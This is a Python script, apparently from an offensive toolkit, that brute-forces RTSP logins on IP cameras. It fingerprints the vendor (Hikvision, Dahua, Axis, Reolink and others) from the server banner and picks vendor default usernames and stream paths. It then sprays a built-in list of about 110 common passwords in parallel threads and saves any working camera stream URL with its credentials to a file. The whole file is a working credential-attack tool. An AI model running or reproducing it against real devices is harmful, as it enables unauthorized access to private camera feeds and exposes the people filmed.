#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
from tqdm import tqdm
import socket
import re
import base64
import os
import concurrent.futures
import threading
from lib.log_cat import LogCat
from lib.calc_io import calcIO 

log = LogCat()
best_threads=calcIO().get()
 

file_lock = threading.Lock()
found_lock = threading.Lock()

class CamLib():
    def Hikvision(self):
        paths = [
            'Streaming/Channels/101', 
            'Streaming/Channels/102',  
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['admin', 'root', 'supervisor']
        return (users, paths)

    def Dahua(self):
        paths = [
            'cam/realmonitor?channel=1&subtype=0',   
            'cam/realmonitor?channel=1&subtype=1',   
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['root', 'system']
        return (users, paths)

    def Uniview(self):
        paths = [
            'ucast/1/1',
            'stream1',
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['admin']
        return (users, paths)

    def Axis(self):
        paths = [
            'axis-media/media.amp',
            'axis-cgi/mjpg/video.cgi',
            'axis-cgi/media.cgi',
            'live.sdp',
        ]
        users = ['root', 'admin']
        return (users, paths)

    def Sony(self):
        paths = [
            'SNC/media/media.amp',
            'live.sdp',
            'videoMain',
        ]
        users = ['admin']
        return (users, paths)

    def Vivotek(self):
        paths = [
            'live.sdp',
            'live',
            'videoMain',
            'videoSub',
        ]
        users = ['admin']
        return (users, paths)

    def TVT(self):
        paths = [
    'cam/realmonitor?channel=1&subtype=0',
    'live.sdp',
    'videoMain',
    'media/video1',
    'media/video2',
    'stream1',
    'stream2',
    'h264',
    'h265',
    'videoSub',
    'ch0_0.h264',
    'ch1_0.h264',
    'user=admin_password=123456_channel=1_stream=0.sdp',
    'live/ch00_0',
    '0',
    '1',
    '11',
    '12',
    'h264Preview_01_main',
    'h264Preview_01_sub',
    ]
        users = ['admin']
        return (users, paths)

    def Reolink(self):
        paths = [
            'h264Preview_01_main',
            'h264Preview_01_sub',
            'live.sdp',
        ]
        users = ['admin']
        return (users, paths)

    def Milesight(self):
        paths = [
            'Streaming/Channels/101',
            'Streaming/Channels/102',
            'live.sdp',
            'videoMain',
            'media/video1',
        ]
        users = ['admin']
        return (users, paths)

class Execute_Cam(CamLib):
    def __init__(self):
        self.__PASSWORD = [
        '123456',
        'admin',
        'password',
        '12345',
        '1234',
        '12345678',
        '123456789',
        '1234567890',
        '111111',
        '123123',
        '1234567',
        '123456a',
        '123abc!',
        '11111111',
        '',
        '000000',
        '666666',
        '88888888',
        '123456789a',
        'admin888',
        'admin123456',
        '12345678910',
        'a123456',
        '123456789abc',
        'admin000',
        'root123',
        'root123456',
        '12345678a',
        'admin123!',
        'admin@123',
        'admin#123',
        '123456789!',
        'password123',
        'password1234',
        'password12345',
        'password123456',
        'qwerty123',
        'qwerty1234',
        'qwerty12345',
        'qwertyuiop',
        'asdfgh',
        'asdfgh123',
        'zxcvbn',
        'zxcvbn123',
        '1qaz2wsx',
        '1q2w3e4r',
        '1q2w3e',
        'qwe123',
        'qweasd',
        'qweasd123',
        'qwertyui',
        '123qweasd',
        'qaz123',
        'wsx123',
        'edc123',
        'admin123!@#',
        'admin@123456',
        'Admin123',
        'ADMIN123',
        'Admin123456',
        'administrator',
        'Administrator',
        'ADMINISTRATOR',
        '123456admin',
        'admin123456789',
        'root123456789',
        'roottoor',
        'toor',
        'fang12345',
        'passw0rd',
        'Passw0rd',
        'PASSWORD',
        'Password',
        '00000000',
        '1111111111',
        '123456789012',
        '987654321',
        '9876543210',
        '12344321',
        '112233',
        '11223344',
        '121212',
        '123123123',
        '12341234',
        '1234512345',
        'camera',
        'Camera',
        'CAMERA',
        'security',
        'Security',
        'SECURITY',
        'surveillance',
        'Surveillance',
        'ipcam',
        'IPCam',
        'IPCAM',
        'dvr',
        'DVR',
        'nvr',
        'NVR',
        'system',
        'System',
        'SYSTEM',
        'null',
        'NULL',
        'none',
        'None',
        'NONE',
        ]
        self.found_valid = False

    def __check_rtsp_combo(self, ip, port, username, password, path):
        with found_lock:
            if self.found_valid:
                return False
        auth_str = f"{username}:{password}"
        b64_auth = base64.b64encode(auth_str.encode()).decode()
        request = (
            f"DESCRIBE rtsp://{ip}:{port}/{path} RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"Authorization: Basic {b64_auth}\r\n"
            f"Accept: application/sdp\r\n"
            f"\r\n"
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(request.encode())
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()

            if "200 OK" in response:
                with found_lock:
                    if self.found_valid:
                        return False
                    self.found_valid = True
                rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/{path}"
                log.success(f"{rtsp_url}")
                os.makedirs('./data', exist_ok=True)
                with file_lock:
                    with open('./data/ipcam.info', 'a', encoding='utf-8') as f:
                        f.write(rtsp_url + '\n')
                return True
        except Exception:
            pass
        return False

    def run(self, ip: str, port=554,password=''):
        if password:
            self.__PASSWORD = list(password)
            log.info(f"Currently entering password spraying : Try Password => [{password}]")
        log.info(f"Current Detection [{ip}:{port}]")
        log.info(f"Optimal high-speed thread count for current computer automatically calculated: {best_threads}")
        _, banner = self.__get_rtsp_banner(ip, port)
        if banner is None:
            log.warning("Skip...")
            return
        else:
            default_paths = [
                'live.sdp',
                'stream1',
                'stream2',
                'h264',
                'h265',
                'videoMain',
                'videoSub',
                'media/video1',
                'media/video2',
                'ch0_0.h264',
                'ch1_0.h264',
                'user=admin_password=123456_channel=1_stream=0.sdp',
                'live/ch00_0',
                '0',
                '1',
                '11',
                '12',
                'h264Preview_01_main',
                'h264Preview_01_sub',
            ]
            users = ['admin']
            banner_lower = banner.lower()
            if 'hikvision' in banner_lower:
                log.info("Hikvision detected...")
                users, default_paths = self.Hikvision()
            elif 'dahua' in banner_lower:
                log.info("Dahua detected...")
                users, default_paths = self.Dahua()
            elif 'uniview' in banner_lower:
                log.info("Uniview detected...")
                users, default_paths = self.Uniview()
            elif 'axis' in banner_lower:
                log.info("Axis detected...")
                users, default_paths = self.Axis()
            elif 'sony' in banner_lower:
                log.info("Sony detected...")
                users, default_paths = self.Sony()
            elif 'vivotek' in banner_lower:
                log.info("Vivotek detected...")
                users, default_paths = self.Vivotek()
            elif 'reolink' in banner_lower:
                log.info("Reolink detected...")
                users, default_paths = self.Reolink()
            elif 'tvt' in banner_lower:
                log.info("TVT detected...")
                users, default_paths = self.TVT()
            elif 'milesight' in banner_lower:
                log.info("Milesight detected...")
                users, default_paths = self.Milesight()
            else:
                log.info("The server-side has hidden the banner and is using default options...")
            
            self.found_valid = False
            combos = [
                (username, password, path)
                for username in users
                for password in self.__PASSWORD
                for path in default_paths
            ]
            with concurrent.futures.ThreadPoolExecutor(max_workers=best_threads) as executor:
                future_to_combo = {
                    executor.submit(self.__check_rtsp_combo, ip, port, user, pwd, path): (user, pwd, path)
                    for user, pwd, path in combos
                }
 
                for future in tqdm(concurrent.futures.as_completed(future_to_combo), 
                                   total=len(future_to_combo), 
                                   desc="Brute Force Progress", 
                                   unit="combo"):
      
                    if self.found_valid:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
  
                    try:
                        future.result()
                    except Exception:
                        pass

    def __get_rtsp_banner(self, ip: str, port=554):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            request = (
                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                "CSeq: 1\r\n"
                "\r\n"
            )
            sock.send(request.encode())
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()
            match = re.search(r"Server:\s*(.+)", response)
            if match:
                server = match.group(1).strip()
            else:
                server = 'N/A'
            return (ip, server)
        except Exception as e:
            return (None, None)